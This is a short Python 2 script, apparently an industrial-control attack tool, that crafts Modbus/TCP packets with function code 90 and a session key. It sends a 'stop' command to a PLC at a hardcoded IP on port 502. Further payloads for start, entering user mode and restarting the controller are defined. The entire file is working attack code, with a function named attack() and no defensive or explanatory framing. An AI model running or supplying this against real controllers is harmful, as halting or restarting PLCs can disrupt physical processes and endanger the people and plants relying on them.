#!/usr/bin/env python 
import socket 
import array 
import optparse 
import sys

# Specify the PLC IP address 
IP = "192.168.1.30" 
# Specify the session key 
key = "\xb8" 
PORT = "502" 
TIMEOUT = 500 
DEBUG = True

# Command list 
#start 
start = key + "\x40\xff\x00" 
#stop 
stop = key + "\x41\xff\x00" 
# enter_user_mode 
enter_user_mode = key + "\x11" 
# restart_controller 
restart_controller = "\x00\x42\x00\x00"


# Commands array 
packets = [stop] # insert commands to execute here (stop/start)

msg = "" 
fError = 0 
rsid = "" 
payload = "" 
s = "" 

def start_banner(): 
    print "[ICSMASTER] Connecting to target controller...\r\n"


def generate_packet(payload): 
    global rsid 
    # MBAP array 
    rsid = array.array('B') 
    rsid.fromstring("\x00\x00\x00\x00\x00\x02\x01\x01")
    #set unit id 
    rsid[6]=1
    #set function 
    rsid[7]=90 
    # DATA array 
    packet_data = array.array('B') 
    packet_data.fromstring(payload) 
    # add data and update data length 
    if (packet_data): 
        rsid += packet_data 
        #update length 
        rsid[5]=len(packet_data)+2 
        if DEBUG == True: 
            print "[INFO] building packet data: "+str(packet_data)


def attack(): 
    global fError, msg, s 
    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.settimeout(float(TIMEOUT) / float(100)) 
        s.connect((str(IP), int(PORT))) 
    except socket.error: 
        #clean up 
        fError=1 
        msg += "[ERROR] FAILED TO CONNECT" 
        s.close() 

 
    try: 
        print "[MRCT] Sending remote commands...\r\n" 
        for packet in packets: 
            generate_packet(packet) 
            if DEBUG == True: 
                print "[INFO] Sending packet: "+str(rsid) 
            s.send(rsid) 
            catch_res() 
    except socket.error: 
         fError=1 
         msg += "[ERROR] FAILED TO SEND" 
         s.close()



def catch_res(): 
    global fError 
    try: 
        data = s.recv(4096) 
    except socket.timeout: 
        fError=1 
        msg += "[ERROR] FAILED TO RECV" 

    if data: 
        resp = array.array('B') 
        resp.fromstring(data)
        if DEBUG == True: 
            print "[INFO] Recieving packet: "+str(resp) 
        if (int(resp[7]) == 90): 
            if DEBUG == True: 
                print "[INFO] Receiving valid response function code from target..."
        else: 
            if (DEBUG == True): 
                print "[WARNING] Unable to parse the response." 
    else: 
        fError=1 
        msg += "\tFAILED TO RECEIVE" 
        s.close() 

    if (fError): 
        print msg


if __name__ == '__main__': 
    start_banner() 
    attack() 
    s.close() 
    print "[ICSMASTER] Command sent to target.\r\n\r\n"
